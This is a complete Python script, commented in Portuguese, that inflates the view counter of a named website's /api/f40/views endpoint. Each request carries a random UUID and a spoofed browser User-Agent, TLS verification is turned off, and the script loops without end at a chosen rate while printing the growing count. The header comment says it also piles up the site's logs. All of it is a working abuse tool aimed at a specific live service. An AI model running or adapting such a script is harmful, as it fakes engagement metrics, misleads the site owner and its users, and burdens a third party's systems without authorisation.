#!/usr/bin/env python3
# views_inflate.py — inflaciona o contador de visualizações do /f40 + pilha logs
# uso: python3 views_inflate.py [rps]   default 5 req/s
import urllib.request,json,ssl,uuid,time,sys,random
BASE="https://woiz.com.br/api/f40/views"
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
def get():
    try:
        r=urllib.request.urlopen(BASE,timeout=8,context=ctx);return json.loads(r.read())["views"]
    except Exception as e:return f"ERR {e}"
def bump():
    uid=str(uuid.uuid4())
    try:
        req=urllib.request.Request(BASE,data=json.dumps({"viewId":uid}).encode(),headers={"Content-Type":"application/json","User-Agent":f"Mozilla/5.0 ({random.choice(['Windows NT 10.0','iPhone','Linux'])})"},method="POST")
        r=urllib.request.urlopen(req,timeout=8,context=ctx)
        return r.status,json.loads(r.read())["views"]
    except urllib.error.HTTPError as e:return e.code,None
    except Exception as e:return "ERR",str(e)[:60]
rps=float(sys.argv[1]) if len(sys.argv)>1 else 5.0
print(f"[*] inflate {rps} req/s contra {BASE}")
via=get();print(f"[*] contador inicial: {via}")
time.sleep(0.5)
ok=0;fail=0
try:
    while True:
        s,v=bump()
        if s==200:ok+=1;print(f"[+] bump ok views={v} total_ok={ok}",flush=True)
        else:fail+=1;print(f"[-] falha {s} v={v}",flush=True)
        time.sleep(1.0/rps)
except KeyboardInterrupt:
    print(f"\n[*] encerrado. +{ok} views, {fail} falhas. contador agora: {get()}")
